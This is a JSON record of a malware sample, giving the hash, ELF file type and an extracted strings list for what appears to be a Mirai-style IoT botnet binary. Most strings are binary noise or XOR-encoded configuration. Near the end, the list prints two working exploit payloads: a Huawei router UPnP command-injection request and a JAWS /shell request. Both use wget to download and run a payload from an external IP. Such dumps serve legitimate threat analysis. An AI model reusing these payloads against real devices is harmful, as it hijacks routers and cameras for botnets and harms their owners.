{
    "malware_data": [
        {
            "filename": "144ef7d3bc81a112bb4bcdc08344b8009a4566262cb9469035aa7e71134cba79.elf",
            "filetype": "7F454C46",
            "filesize": "65KB",
            "hash_sha256": "144ef7d3bc81a112bb4bcdc08344b8009a4566262cb9469035aa7e71134cba79",
            "strings": [
                "ff/F/",
                "|?&O",
                "3=R'04",
                "W,7pa",
                "2\"R@",
                "a)By!",
                "!;\"kf",
                "2)%#a)')A",
                "AMB[!+'{!",
                "B#a=A(1",
                ",S,T",
                "-K!z",
                "A<1s`",
                ";\"s4\"!",
                "`L0(",
                "38P'",
                "I#;a",
                "4&P'S",
                "4)P*S",
                "TH$j",
                "3s`2a",
                "AL1s`",
                ";\"s0\"!",
                ";\"G7\"!",
                "3=RBa",
                "r'1-",
                "i-A&",
                "2Ba\"/",
                "B@u\\",
                "2#X$",
                "d=HL8",
                ",80)",
                "Lds`",
                "lfSa",
                "s#e@3",
                "/sm\"O,",
                "w`;!",
                "qx'g",
                " !3b",
                "r ask",
                "s3kD",
                "qsj !<",
                "Lds`La",
                "a`12",
                "s#e04",
                "RdH$",
                "\"\\ez",
                ",b#a",
                "/\"O^",
                "7qg4",
                "}b`fBr-a",
                "Qlf5",
                "&-af",
                "S-b,k",
                "W/v[",
                " (w$Q.u",
                "`) @",
                "2$R&",
                "sBv1",
                "Bluu",
                "Chuq",
                "Gdun",
                "a{\"?",
                "@;\"=",
                "P)'#a)#",
                "AmB{!+#;!",
                "7rPrQ",
                "/\"OZ",
                "=b4r-a",
                "-b,j|a",
                "ya)s8",
                "d$Q u@",
                "v4wa",
                "a{\"=",
                "@;\"<",
                "|33a",
                "k#-@",
                "62/a",
                "6\"QnS",
                "R#ay!p1",
                ")'#a)#)A",
                "Q{#+#y",
                "9\"3a",
                "c,ai ",
                "c#g#a",
                "*\"aqc",
                "x1(\"Q",
                "#)!r",
                "W)!o",
                "2*Uk!g",
                "d)!d",
                "`)!a",
                "Q(ve",
                "s#3?",
                "7zPz](p",
                ",dQ@",
                ".xQlj",
                "+-qP",
                "Ti @",
                "(}DL",
                "d\"qzU",
                "(wr/",
                "a{\";",
                "@;\":",
                ")'#a)#",
                "^]cla\\",
                "APe|l3j",
                "tP'(x",
                ")q (",
                "F*xM",
                "(,qp!",
                "a{\"A",
                "@;\"@",
                "/\"Og",
                "AmH|g;\"'",
                "\"}@$",
                "2)'#a)#)A",
                "/Sn\"O}",
                "Q\"`#c",
                "a{\"M",
                "@;\"K",
                " #e@",
                "u0'#c",
                "/\"O{",
                "qb`cb",
                " ch@",
                "tpgc`",
                "\"ca!# ",
                " !cb",
                "-b|1",
                "h{\"&",
                "@;\"%",
                "@sd@",
                "m}g9",
                "M=b$",
                "/r-a",
                "'<ar",
                "#nla,b",
                "B`Cc",
                "`\"1!Cc",
                ",8q$",
                "Amfd",
                "r'7&",
                "JR**",
                "-a@a",
                "2-a#`)@",
                "/s`miCWDX",
                "t@bsa9'",
                "`)A|1)@,b9(",
                "3b) ",
                "/\"OB`",
                "qV2q!",
                "sf\\1",
                "!CQ ",
                "P2c003",
                "NMA;.",
                "\"+.A",
                "4R3d",
                "C!!6",
                "21\"0",
                "VUUU",
                "DRra",
                "3a9'CV9\"",
                "A;\"5",
                "{!+!5",
                "GMA;'",
                "\"+'`7",
                "Cc,3Sf",
                "3d2Q",
                "As`<1",
                "7;\"\"!",
                "saMA",
                "C;\"\"!",
                "C)#8#a",
                "!+)*",
                ";\"Sak\"I",
                "B<cmA{\"C",
                "#;\"$",
                "DRac",
                "-rdu",
                "4RBa",
                "SsV)",
                ")A9\"9'",
                "A;\"%",
                "{!+!\"",
                "x`8:",
                "Rra(1",
                "<1rb",
                "x'4\"",
                "`0al",
                "d0al",
                "/\"OF",
                "B3eZ",
                "7|2\"a",
                "3<2S",
                "G2d{!",
                "3'0i",
                "#a}A",
                "\"Bc#`ra",
                "&Ra2%",
                "Gz#:\"* ",
                "/\"O:",
                "j\"drc7",
                "Sb}B:!Z\"",
                "&l`cc",
                "y ! ",
                "dSjce",
                "Z!#f",
                "B#a=A,1",
                "7Ccp)",
                "b R!",
                "\"B#$",
                "Az\"j!#c",
                "C*#2$",
                "ech3fsb",
                "ccsb",
                "\"ca:!#c",
                "C*#1$",
                "b+2!",
                "Cb+z\":&#aj\"R*",
                "\"OAT",
                "qP&#f",
                ",a#i",
                "Z&F3T",
                "Z&#c\\3",
                "0as`",
                "c,3L3",
                "3s`0a",
                "c`|0",
                "A,b+!p1",
                "p4b$",
                "p0b$",
                "0e1T\\e",
                "g|a,b",
                "/\"OAP",
                "/\"O;",
                "P,1&",
                "g3amA|1Qf",
                "ql22,!!!%",
                "R`Sb",
                "!3Q:",
                "HCe6",
                "HCe5",
                "HCe4",
                "HCe3",
                "HCe)",
                "HCen",
                "BSa;\"H",
                "b<c)B",
                "#{\";\"$",
                "4RQc",
                "3a9'",
                "V9\")A",
                "A;\"8",
                "{!+!8",
                "G]A;'",
                "SbSQ",
                "l5#a",
                "!#d\"",
                "a(1f1Y",
                "csamA",
                "U3a-A",
                "A3`\\139",
                "G{\"\"!",
                "!a#e",
                "V2a,6f",
                "jc=:",
                "r&3!",
                "rl1&1",
                "Sb)BSa",
                "ASc)C",
                "h.d^cba|1",
                "b:\" !ba|1",
                "\" !ba|1",
                "wJ\" !",
                "/\"Oq",
                "J@|\\",
                "J!!\"",
                "r#`\\",
                "/\"Ota",
                "4lb#a",
                "r,aV11",
                "ca81",
                "r#`L",
                "@acc",
                "S`#q",
                " !Cc",
                "b|2 a",
                "CcKc8#",
                "%ZE-",
                "q)!h",
                "(w2\"$qq",
                "wraSc",
                "@~3`",
                " 3`@~",
                "q\"f3`",
                " @~3`",
                "/3`\"O",
                "wra6",
                "/Sh\"O",
                "3e3a u",
                "a,q3b2",
                "0R!S",
                "emf3`",
                "/\"O+",
                "/Ci\"O",
                "28#!",
                "uCb^",
                "sc&0(C",
                "sc&0",
                "c`K [ h&",
                "C`l0",
                "H5g1",
                "Scg1",
                "uCg^",
                "w(&Sc",
                "#Cb00",
                "qQSRVSWTXUYVZW[",
                "(!Sc",
                "v0f ",
                "qVcVf(@Vg= Vhm#Vi}&Vj",
                "#`K`cm",
                "&6DT",
                "v3a;",
                "v3a(",
                "vra2\"qS",
                "vwSh&",
                " r2\"T",
                "c {!",
                "zcd&",
                "u#dc`",
                "bCa-GSP",
                "6Sil4",
                "#`C`",
                "*:JZ",
                "rCa!W",
                "rCa\"V",
                "rCa#W",
                "rCa$V",
                "rCa%W",
                "rCa&V",
                "r'WCa",
                "cCa(V",
                "s'Wg",
                "s\"f8#r!",
                "\"Cc {",
                "j\"UCc!X",
                "j#WCc\"U",
                "rCc$V#W",
                "j%XCc$V",
                "Fca{!",
                "ncg/",
                "Cb\\fca",
                "ca2\"1",
                "nB.Q",
                "/\"OD",
                "'b)!",
                "h)('",
                "/ScG",
                "/\"OT",
                "#a,q",
                "3b\"$",
                "3b(1",
                " 80\"%",
                "n\"c81",
                "!Wx'",
                "\"Q!R",
                "c!R(\"",
                "/h&b",
                "x'R$x'",
                "\"OBh",
                "l98#",
                "e2a2V",
                "sarb(1",
                ",93fsesh",
                "/\"O_",
                "A|11",
                "p\"OSS",
                "nRR8##f",
                "eQQ(1!A!A",
                "2<2/",
                "!C'9",
                "A<1#c",
                "A8#,13",
                "Race",
                "#cL33d",
                "gfff",
                "BcAR2a3f&g",
                "vFU|1",
                "/\"OSR",
                "nH$RW",
                "(\"B'2",
                "4G:*2",
                "4B#S6",
                "|2\")",
                "1!A!A",
                "8\"O!H",
                "/l5\"O",
                "pScS",
                "2(\"!ba",
                "CmR(O",
                "Sb&a",
                "c@s7P",
                "=R;Q 1",
                "!H\"!",
                "da)mf0a",
                "/\"Ol",
                "#<7&7",
                "/Sf\"O",
                "b0Q r",
                "(-b2Qq",
                "Q-b\"(]e",
                "1a-b",
                "t@b#`",
                "(\"#`.",
                "sc-Cy!sb",
                "G)B|g",
                "\"{#;\"\"*",
                "/Ck\"O;",
                "R|q3",
                "POST /cdn-cgi/",
                " HTTP/1.1",
                "User-Agent: ",
                "Host: ",
                "Cookie: ",
                "http",
                "url=",
                "POST",
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Content-Length: 430",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 157.90.250.90 -l /tmp/.unstable -r /h0r0zx00xh0r0zx00xdefault/h0r0zx00x.mips; /bin/busybox chmod 777 * /tmp/.unstable; /tmp/.unstable huawei.exploit)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "GET /shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws HTTP/1.1",
                "User-Agent: Hello, world",
                "Host: 127.0.0.1:80",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "abcdefghijklmnopqrstuvw012345678",
                "vkkp",
                "pe^~D670=1<1=",
                "pwckmjckj",
                "wkhkoa}",
                "e`imj",
                "`abeqhp",
                "qwav",
                "cqawp",
                "pahjape`imj",
                "5555",
                "56701",
                "567012",
                "10765",
                "<<<<<<<<",
                "644<4<62",
                "222222",
                "<<<<<<",
                "5445glmj",
                "|g7155",
                "rm~|r",
                "nrf~`",
                "lc6|4",
                "^pa165",
                "cvkqpav",
                "pahjap",
                "kahmjq|567",
                "ph3<=",
                "CI<5<6",
                "lqjp131=",
                "pahagkie`imj",
                "psa<alkia",
                "jic|[setme",
                "tvmrepa",
                "efg567",
                "VKKP144",
                "elap~mt<",
                "ejok",
                "ewgaj`",
                "fhaj`av",
                "gep546=",
                "glejcaia",
                "m@mvagp",
                "jbhagpmkj",
                "mtgei[vp1714",
                "wswf~ocj",
                "nqejpagl",
                "teww",
                "tewwskv`",
                "wrck`ma",
                "p4pehg4jpv4h0%",
                "~lkjc|mjc",
                "~h||*",
                "~wqj55<<",
                "|il`mtg",
                "ohr567",
                "lm715<",
                "3qnIok4rm~|r",
                "3qnIok4e`imj",
                "`vaeifk|",
                "w}wpai",
                "msof",
                "vaehpao",
                "44444444",
                "56705670",
                "lqmcq74=",
                "smj5`ksw",
                "ejpwhu",
                "qjwpefha[mw[pla[lmwpkv}[kb[qjmravwa",
                "a~haeow*gki",
                "+tvkg+",
                "+a|a",
                "+ijp",
                "+wpepqw",
                "+tvkg+jap+pgt",
                "+gi`hmja",
                "+pit+",
                "+`epe+hkgeh+pit",
                "up|fkp",
                "imtw",
                "itwh",
                "fkp&Y",
                "leoem",
                "wlahh",
                "ajefha",
                "hmjq|wlahh",
                "+fmj+fqw}fk|$QJWPEFHA",
                "QJWPEFHA>$etthap$jkp$bkqj`",
                "jgkvvagp",
                "kcmj",
                "ewwskv`",
                "ajpav",
                "+`ar+sepgl`kc",
                "+`ar+imwg+sepgl`kc",
                "+wfmj+sepgl`kc",
                "+fmj+sepgl`kc",
                "+`ar+BPS@P545[sepgl`kc",
                "+`ar+BPS@P545+sepgl`kc",
                "+`ar+sepgl`kc4",
                "+apg+`abeqhp+sepgl`kc",
                "+apg+sepgl`kc",
                "eEw5606g41Bcn0",
                "PWkqvga$Ajcmja$Uqav}",
                "+apg+vawkhr*gkjb",
                "jeiawavrav$",
                "Gkjjagpmkj>$oaat)ehmra",
                "Eggatp>$pa|p+lpih(etthmgepmkj+|lpih/|ih(etthmgepmkj+|ih?u94*=(mieca+saft(.+.?u94*<",
                "Eggatp)Hejcqeca>$aj)QW(aj?u94*<",
                "Gkjpajp)P}ta>$etthmgepmkj+|)sss)bkvi)qvhajgk`a`",
                "wapGkkoma,#",
                "vabvawl>",
                "hkgepmkj>",
                "wap)gkkoma>",
                "gkjpajp)hajcpl>",
                "pvejwbav)ajgk`mjc>",
                "glqjoa`",
                "gkjjagpmkj>",
                "wavrav>$`kwevvawp",
                "wavrav>$ghkq`bheva)jcmj|",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+15*4*6340*547$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$2*5?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+15*4*6340*547$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$2*5?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*72",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54[55[2-$EtthaSafOmp+245*3*3$,OLPIH($hmoa$Cagok-$Ravwmkj+=*5*6$Webevm+245*3*3",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$1*5?$Pvm`ajp+1*4-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*4?$Pvm`ajp+0*4?$CPF3*0?$MjbkTepl*7?$WR5?$*JAP$GHV$7*0*17724?$SKS20?$aj)QW-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$B@I?$IWMAGveshav?$Ia`me$Gajpav$TG$1*4-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$CPF3*0?$MjbkTepl*6?$WR5?$*JAP$GHV$0*0*1<3==?$SKS20?$aj)QW-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+1*4?$BqjSafTvk`qgpw-",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*2?$vr>61*4-$Cagok+64544545$Bmvabk|+61*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*<?$vr>65*4-$Cagok+64544545$Bmvabk|+65*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*<?$vr>60*4-$Cagok+64544545$Bmvabk|+60*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54[54?$vr>77*4-$Cagok+64544545$Bmvabk|+77*4",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$Smj20?$|20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+26*4*7646*=0",
                "/dev/null",
                "CAk[S",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".ctors",
                ".dtors",
                ".data",
                ".bss"
            ]
        }
    ]
}